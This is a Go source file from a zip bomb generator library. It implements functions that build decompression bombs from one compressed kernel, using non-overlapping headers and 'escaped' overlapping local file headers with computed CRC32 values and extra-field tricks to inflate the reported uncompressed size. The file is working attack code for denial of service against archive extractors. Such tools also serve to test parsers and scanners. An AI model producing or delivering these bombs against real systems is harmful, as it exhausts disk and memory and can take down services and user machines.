package zipbomb

import (
	"hash/crc32"

	"github.com/hupe1980/zipbomb/pkg/filename"
)

type OnFileCreateHookFunc = func(name string)

type OverlapOptions struct {
	FilenameGen      filename.Generator
	OnFileCreateHook OnFileCreateHookFunc
	Method           uint16
	CompressionLevel int // Deflate [-2,9]
	ExtraTag         uint16
}

func (zb *ZipBomb) AddNoOverlap(kernelBytes []byte, numFiles int, optFns ...func(o *OverlapOptions)) error {
	opts := OverlapOptions{
		FilenameGen:      filename.NewDefaultGenerator(filename.DefaultAlphabet, ""),
		CompressionLevel: 5,
		Method:           Deflate,
	}

	for _, fn := range optFns {
		fn(&opts)
	}

	k, err := newKernel(opts.FilenameGen.Generate(numFiles-1), kernelBytes, opts.Method, opts.CompressionLevel)
	if err != nil {
		return err
	}

	files := []fileRecord{
		{
			header: k.LocalFileHeader(),
			data:   k.CompressedBytes(),
		},
	}

	if opts.OnFileCreateHook != nil {
		opts.OnFileCreateHook(k.Name())
	}

	zb.uncompressedSize = zb.uncompressedSize + int64(k.UncompressedSize())

	for len(files) < numFiles {
		lfh := newFileHeader(
			k.CompressedSize(),
			k.UncompressedSize(),
			k.CRC32(),
			opts.FilenameGen.Generate(numFiles-1-len(files)),
			opts.Method,
		)

		files = append([]fileRecord{{
			header: lfh,
			data:   k.CompressedBytes(),
		}}, files...)

		zb.uncompressedSize = zb.uncompressedSize + int64(lfh.UncompressedSize)

		if opts.OnFileCreateHook != nil {
			opts.OnFileCreateHook(lfh.Name)
		}
	}

	return zb.writeFiles(files)
}

func (zb *ZipBomb) AddEscapedOverlap(kernelBytes []byte, numFiles int, optFns ...func(o *OverlapOptions)) error {
	opts := OverlapOptions{
		FilenameGen:      filename.NewDefaultGenerator(filename.DefaultAlphabet, ""),
		CompressionLevel: 5,
		Method:           Deflate,
	}

	for _, fn := range optFns {
		fn(&opts)
	}

	k, err := newKernel(opts.FilenameGen.Generate(numFiles-1), kernelBytes, opts.Method, opts.CompressionLevel)
	if err != nil {
		return err
	}

	files := []fileRecord{
		{
			header: k.LocalFileHeader(),
			data:   k.CompressedBytes(),
		},
	}

	if opts.OnFileCreateHook != nil {
		opts.OnFileCreateHook(k.Name())
	}

	zb.uncompressedSize = zb.uncompressedSize + int64(k.UncompressedSize())

	// Calculate how many files we can escape with the extra field.
	extraFieldEscapedFile := 0

	if opts.ExtraTag != 0 {
		sum := 0
		for sum <= uint16max {
			sum = sum + fileHeaderLen + 4 + 20 + len(opts.FilenameGen.Generate(extraFieldEscapedFile+1))
			extraFieldEscapedFile = extraFieldEscapedFile + 1
		}

		extraFieldEscapedFile = extraFieldEscapedFile - 1
	}

	if opts.Method == Deflate {
		for len(files) < numFiles-extraFieldEscapedFile {
			next := files[0]

			headerBytes, err := next.header.MarshalBinary()
			if err != nil {
				return err
			}

			crc32 := crc32.NewIEEE()

			crc32.Write(headerBytes)

			for i := 1; i < len(files); i++ {
				hb, err := files[i].header.MarshalBinary()
				if err != nil {
					return err
				}

				crc32.Write(hb)
			}

			crc32.Write(k.Bytes())

			escape := newEscape(
				opts.FilenameGen.Generate(numFiles-1-len(files)),
				next.header,
				uint16(len(headerBytes)),
				crc32,
			)

			files = append([]fileRecord{{
				header: escape.LocalFileHeader(),
				data:   escape.Data(),
			}}, files...)

			zb.uncompressedSize = zb.uncompressedSize + int64(escape.LocalFileHeader().UncompressedSize)

			if opts.OnFileCreateHook != nil {
				opts.OnFileCreateHook(escape.Name())
			}
		}
	}

	for len(files) < numFiles {
		next := files[0]

		headerBytes, err := next.header.MarshalBinary()
		if err != nil {
			return err
		}

		lfh := newFileHeader(
			next.header.CompressedSize64,
			next.header.UncompressedSize64,
			next.header.CRC32,
			opts.FilenameGen.Generate(numFiles-1-len(files)),
			opts.Method,
		)

		lfh.SetExtraLengthExcess(uint16(len(headerBytes)) + next.header.ExtraLengthExcess())

		files = append([]fileRecord{{
			header: lfh,
			data:   nil,
		}}, files...)

		zb.uncompressedSize = zb.uncompressedSize + int64(lfh.UncompressedSize)

		if opts.OnFileCreateHook != nil {
			opts.OnFileCreateHook(lfh.Name)
		}
	}

	return zb.writeFiles(files)
}
